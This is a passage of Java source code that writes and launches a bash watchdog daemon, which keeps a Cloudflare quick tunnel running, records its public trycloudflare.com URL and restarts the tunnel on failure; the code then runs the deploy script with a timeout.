        "                URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
        "                if [ -n \"$URL\" ]; then echo \"$URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"; CF_PID=$NEW_PID; TUNNEL_OK=true; break; fi\n" +
        "                sleep 1\n" +
        "            done\n" +
        "            if [ \"$TUNNEL_OK\" != \"true\" ]; then kill \"$NEW_PID\" 2>/dev/null; wait \"$NEW_PID\" 2>/dev/null; CF_PID=\"\"; fi\n" +
        "        done\n" +
        "    fi\n" +
        "    sleep 5\n" + // 缩短探针周期到 5 秒，更快发现故障
        "done\n" +
        "DAEMONSCRIPT\n" +
        "chmod +x daemon.sh\n" +
        "setsid bash ./daemon.sh >> daemon.log 2>&1 &\n" +
        "echo \"$!\" >> .pids\n";

    Files.writeString(script, content);
    script.toFile().setExecutable(true);
    Files.writeString(dir.resolve(".pids"), "");
    return script;
}

private static void executeDeployScript(Path script) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
    pb.directory(script.getParent().toFile());
    pb.redirectErrorStream(true);
    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
    Process p = pb.start();
    Thread t = new Thread(() -> { try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) { while (r.readLine() != null) {} } catch (IOException ignored) {} }, "Deploy-Log");
    t.setDaemon(true); t.start();
    if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); p.waitFor(30, TimeUnit.SECONDS); }
} 
}
